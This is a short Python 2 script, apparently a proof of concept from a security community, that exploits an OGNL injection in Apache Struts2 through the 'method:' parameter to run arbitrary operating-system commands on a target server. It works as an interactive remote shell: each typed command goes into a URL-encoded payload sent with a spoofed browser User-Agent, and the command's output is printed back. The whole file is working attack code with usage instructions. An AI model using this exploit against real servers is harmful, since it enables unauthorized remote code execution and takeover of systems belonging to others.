#coding=utf-8

import requests
import sys

'''
author:wanger@wooyun.org
'''
if len(sys.argv) == 2:
    link = sys.argv[1]
    s1 = link + "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd="
    s2 = "&pp=\\A&ppp=%20&encoding=UTF-8"
    loop = 1
    while loop == 1:
        cmdstr = raw_input("# ")
        while cmdstr.strip() == '':
            cmdstr = raw_input("# ")
        if cmdstr.strip() == '\q':
            print "Bye!"
            sys.exit()
        try:
            headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"}
            res=requests.get(s1+cmdstr+s2,headers = headers)
            if res.status_code == 200:
                print res.content
            else:
                print "connect failed!"
                sys.exit()
        except Exception,e:
            print e
            print "RCE FAILED!"
            sys.exit()

else:
    print "USG:\npython cmd.py http://1.2.3.4:8080/xxx.action"
    print "use '\q' to exit the shell"
    sys.exit()
    
